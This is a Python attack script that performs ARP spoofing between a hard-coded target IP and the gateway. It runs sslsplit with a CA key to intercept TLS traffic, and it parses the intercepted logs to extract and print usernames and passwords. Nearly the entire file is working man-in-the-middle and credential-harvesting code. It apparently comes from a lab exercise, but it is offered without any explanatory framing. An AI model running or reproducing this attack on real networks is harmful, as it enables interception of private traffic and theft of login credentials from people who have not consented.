#!/usr/bin/env python3

import netifaces
import scapy.all as scapy
import time
import threading
import os
# from netaddr import IPAddress
import math
from os import listdir
from os.path import isfile, join
import os
import sys

def get_mac(ip):
    for a in range(10):
        arp_request = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list, unanswer = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)
        if len(answered_list) == 0:
            print("no find")
            continue
        else:
            return answered_list[0][1].hwsrc
    print("Can't find mac address")
    os.exit(1)

    # return 'b4:6b:fc:1d:e8:9f' # error here, use this for temp

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
  
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

def translate_to_slash(netmask):
    temp = netmask.rsplit('.')
    number = 0
    for i in range(4):
        number = number << 8
        number += int(temp[i])
    slash = 0
    for i in range(32):
        if number % 2 == 1:
            slash = i
            break
        number = number >> 1
    return 32 - slash


def get_local_info():
    # interfaces = netifaces.ifaddresses('wlp3s0')
    interfaces = netifaces.ifaddresses('enp0s3')
    # dictionary
    normal_internet = interfaces[netifaces.AF_INET][0]
    address = normal_internet['addr']
    netmask = normal_internet['netmask']
    broadcast = normal_internet['broadcast']
    # slash = IPAddress(netmask).netmask_bits()
    slash = translate_to_slash(netmask)
    # obtain gateway
    gws = netifaces.gateways()
    gw = gws['default'][netifaces.AF_INET][0]
    
    return address, netmask, broadcast, str(slash), gw

def getDevice(ip):
    request = scapy.ARP()
    request.pdst = ip
    broadcast = scapy.Ether()

    broadcast.dst = 'ff:ff:ff:ff:ff:ff'

    request_broadcast = broadcast / request
    clients = scapy.srp(request_broadcast, timeout=10, verbose=1)[0]

    print('Available devices')
    print('----------------------------')
    print('IP         MAC')
    print('----------------------------')
    for element in clients:
        print(element[1].psrc + "   " + element[1].hwsrc)
    print(' ')

def get_information(filename, record):
    # parse log
    line = ""
    log = open(filename, 'rb')
    byte = 1

    # for i in range(100):
    while byte:
        line = ""
        while 1:
            byte = log.read(1)
            if not byte:
                log.close()
                break
            # byte = str(byte)[2]
            line = line + str(byte)[2]
            if byte == b'\n':
                # print("next line")
                break
        line = line[:len(line)-2]
        username = line.find('username=')
        if username != -1:
            try:
                # print(line)
                # find start with find username
                # erase username&
                line = line[username + 9:]
                first_and_mark = line.find('&')
                username = line[:first_and_mark]

                # erase  &password=
                line = line[first_and_mark+10:]
                first_and_mark = line.find('&')
                password = line[:first_and_mark]
                try:
                    record[username]
                except KeyError:
                    print()
                    print("Username: ",username)
                    print("Password ",password)
                    record[username] = password
            except:
                pass
    return record

def sslSplit(stop):
    # x = 0
    # while x < 5:
    #     os.system("date")
    #     x = x + 1
    #     time.sleep(2)
    # print("[-] sslSplit stopped")
    
    # obtain file path
    pathname = os.path.realpath(__file__)
    last = pathname.rfind('/')
    mypath = pathname[:last]
    # run sslsplit
    command =   'sslsplit -D -l ' + mypath + '/sslsplit/connections.log'\
            ' -j ' + mypath + '/sslsplit/'\
            ' -S ' + mypath + '/sslsplit/logdir/'\
            ' -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080'
    os.system(command)
    # while loop keep search username and password
    logpath = mypath + "/sslsplit/logdir/"
    # used set() to record
    # already_search = set()
    record = {}
    while stop() == 0:
        onlyfiles = [f for f in listdir(logpath) if isfile(join(logpath, f))]
        for i in onlyfiles:
            record = get_information(logpath + i, record)
        time.sleep(5)




if __name__ == '__main__':

    address, netmask, broadcast, slash, gw = get_local_info()

    # print(get_mac('192.168.99.100')) 
    getDevice(address + '/' + slash)

    target_ip = "192.168.99.100" # Enter your target IP
    # gateway_ip = "192.168.99.1" # Enter your gateway's IP
    gateway_ip = gw


    t = threading.Thread(target = sslSplit, args =(lambda : stop_threads, ))
    t.start()
    stop_threads = False

    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip) # cheat on victim to know I am gateway
            spoof(gateway_ip, target_ip) # cheat on switch to know I am target
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
            # time.sleep(0.5) # Waits for two seconds
    
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[-] Arp Spoof Stopped")
        stop_threads = True
        t.join()
        print("stop thread")

    # interface = netifaces.interfaces()[1]
    # print('=============')
    # print('Interface Info')
    # print('=============')
    # print(netifaces.ifaddresses(interface))
    # print(' ')

    # request = scapy.ARP()
    # print('============')
    # print('Request Info')
    # print('============')
    # print(request.summary())
    # print(' ')